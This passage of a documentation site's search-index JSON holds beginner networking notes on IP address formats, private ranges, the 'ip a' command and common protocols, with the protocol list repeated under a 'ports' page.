IP","text":"<ul> <li>IPv4 \u2192 192.168.1.1  </li> <li>IPv6 \u2192 longer format  </li> </ul>"},{"location":"networking/ip/#private-ip-range","title":"Private IP Range","text":"<ul> <li>192.168.x.x  </li> <li>10.x.x.x  </li> <li>172.16.x.x  </li> </ul>"},{"location":"networking/ip/#public-ip","title":"Public IP","text":"<ul> <li>accessible over internet  </li> </ul>"},{"location":"networking/ip/#check-ip","title":"Check IP","text":"<pre><code>ip a\n</code></pre>"},{"location":"networking/ip/#use-case","title":"Use Case","text":"<ul> <li>identify devices  </li> <li>routing data  </li> </ul>"},{"location":"networking/ports/","title":"Protocols","text":""},{"location":"networking/ports/#what-is-protocol","title":"What is Protocol","text":"<ul> <li>set of rules for communication  </li> </ul>"},{"location":"networking/ports/#common-protocols","title":"Common Protocols","text":"<ul> <li>HTTP \u2192 web traffic  </li> <li>HTTPS \u2192 secure web  </li> <li>FTP \u2192 file transfer  </li> <li>SSH \u2192 secure remote access  </li> <li>DNS \u2192 domain to IP  </li> <li>TCP \u2192 reliable communication  </li> <li>UDP \u2192 fast communication  </li> </ul>"},{"location":"networking/ports/#use-case","title":"Use Case","text":"<ul> <li>web browsing  </li> <li>remote login  </li> <li>file transfer  </li> </ul>"},{"location":"networking/protocols/","title":"Protocols","text":""},{"location":"networking/protocols/#what-is-protocol","title":"What is Protocol","text":"<ul> <li>set of rules for communication  </li> </ul>"},{"location":"networking/protocols/#common-protocols","title":"Common Protocols","text":"<ul> <li>HTTP \u2192 web traffic  </li> <li>HTTPS \u2192 secure web  </li> <li>FTP \u2192 file transfer  </li> <li>SSH \u2192 secure remote access  </li> <li>DNS \u2192 domain to IP  </li> <li>TCP \u2192 reliable communication  </li> <li>UDP \u2192 fast communication  </li> </ul>"},{"location":"networking/protocols/#use-case","title":"Use Case","text":"<ul> <li>web browsing  </li> <li>remote login  </li> <li>file transfer  </li> </ul>"}]}